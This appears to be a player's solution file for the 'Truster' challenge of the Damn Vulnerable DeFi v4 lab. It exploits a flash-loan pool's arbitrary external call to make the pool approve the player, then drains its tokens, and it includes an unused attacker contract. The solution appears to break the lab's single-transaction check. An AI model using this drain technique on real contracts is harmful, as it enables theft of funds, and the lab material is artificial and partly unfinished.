// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            TOKENS_IN_POOL
        );

        // Execute the flash loan with 0 amount, targeting the token contract
        pool.flashLoan(0, player, address(token), data);

        vm.startPrank(player);
        // Transfer all the tokens from the pool to the player
        token.transferFrom(address(pool), player, TOKENS_IN_POOL);

        // Optional: Transfer from player to recovery (based on your _isSolved function)
        // vm.prank(player);
        token.transfer(recovery, TOKENS_IN_POOL);
        vm.stopPrank();
    }

    function test_reenter() public {
        //ReentrancyAttacker attacker = new ReentrancyAttacker(pool, token, this);
        // Prepare the data to approve the player to spend all of the pool's tokens
        vm.startPrank(player);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            TOKENS_IN_POOL
        );

        // Execute the flash loan with 0 amount, targeting the token contract
        pool.flashLoan(0, player, address(token), data);
        // Transfer all the tokens from the pool to the player
        token.transferFrom(address(pool), player, TOKENS_IN_POOL);

        // Optional: Transfer from player to recovery (based on your _isSolved function)
        // vm.prank(player);
        token.transfer(recovery, TOKENS_IN_POOL);
        vm.stopPrank();
    }

    function take_money() public {
        vm.startPrank(player);
        pool.token().approve(address(player), token.balanceOf(address(pool)));
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

contract ReentrancyAttacker {
    TrusterLenderPool victim;
    DamnValuableToken token;
    TrusterChallenge challenge;

    constructor(
        TrusterLenderPool _victim,
        DamnValuableToken _token,
        TrusterChallenge _challenge
    ) {
        victim = _victim;
        token = _token;
        challenge = _challenge;
    }

    function attack() public payable {
        console.log("Attacking", token.balanceOf(address(this)));
        token.approve(address(challenge), token.balanceOf(address(this)));
        token.transfer(address(victim), token.balanceOf(address(this)));
        console.log("Balance", token.balanceOf(address(victim)));
    }
}
